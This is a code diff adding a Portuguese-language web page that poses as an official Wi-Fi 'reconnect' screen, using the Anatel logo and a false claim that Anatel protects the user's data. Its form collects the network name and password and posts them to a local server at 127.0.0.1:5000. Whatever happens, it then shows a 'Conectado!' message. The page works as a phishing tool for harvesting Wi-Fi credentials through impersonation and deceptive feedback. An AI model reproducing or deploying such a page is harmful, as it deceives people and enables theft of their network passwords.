@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link rel="icon" type="image/x-icon" href="favicon.ico" />
+    <link rel="stylesheet" href="./style.css" />
+    <title>Acesso Seguro</title>
+  </head>
+
+  <body>
+    <div class="container">
+      <h2 class="text-center mt-4">Reconectar Rede Wifi</h2>
+      <img
+        src="./img/sinal-wifi.png"
+        alt="Sinal Wi-Fi"
+        class="d-block mx-auto mb-4"
+      />
+
+      <form id="wifiForm" class="mb-4">
+        <div class="mb-3">
+          <label for="ssid" class="form-label">Nome da Sua Rede:</label>
+          <div class="input-group">
+            <input
+              type="text"
+              id="ssid"
+              name="ssid"
+              required
+              class="form-control"
+            />
+            <span class="input-group-text">
+              <img src="./img/engrenagem.png" alt="Configuração" class="icon" />
+            </span>
+          </div>
+        </div>
+
+        <div class="mb-3">
+          <label for="password" class="form-label">Senha:</label>
+          <div class="input-group">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              required
+              class="form-control"
+            />
+            <span class="input-group-text">
+              <img
+                src="./img/escudo-de-seguranca.png"
+                alt="Segurança"
+                class="icon"
+              />
+            </span>
+          </div>
+        </div>
+
+        <button type="submit" class="btn btn-primary">Login</button>
+      </form>
+
+      <div id="info" class="text-center">
+        <img
+          src="./img/anatel-removebg-preview.png"
+          alt="Anatel"
+          class="mb-4"
+        />
+        <h1>
+          A Anatel garante a criptografia segura dos seus dados e proteção de
+          dados.
+        </h1>
+      </div>
+    </div>
+
+    <!-- Modal -->
+    <div
+      class="modal fade"
+      id="connectionModal"
+      tabindex="-1"
+      aria-labelledby="connectionModalLabel"
+      aria-hidden="true"
+    >
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" id="connectionModalLabel">
+              Status da Conexão
+            </h5>
+            <button
+              type="button"
+              class="btn-close"
+              data-bs-dismiss="modal"
+              aria-label="Close"
+            ></button>
+          </div>
+          <div class="modal-body text-center">Conectado!</div>
+          <div class="modal-footer">
+            <button
+              type="button"
+              class="btn btn-secondary"
+              data-bs-dismiss="modal"
+            >
+              Fechar
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+      document
+        .getElementById("wifiForm")
+        .addEventListener("submit", async function (event) {
+          event.preventDefault(); // Previne o comportamento padrão do formulário
+
+          const ssid = document.getElementById("ssid").value;
+          const password = document.getElementById("password").value;
+
+          const response = await fetch("http://127.0.0.1:5000/reconnect", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ ssid, password }),
+          });
+        });
+          document
+            .getElementById("wifiForm")
+            .addEventListener("submit", function (event) {
+              event.preventDefault(); // Previne o comportamento padrão do formulário
+
+              // Apenas mostra o modal sem fazer uma requisição
+              var connectionModal = new bootstrap.Modal(
+                document.getElementById("connectionModal")
+              );
+
+              connectionModal.show();
+            });
+    </script>
+  </body>
+</html>
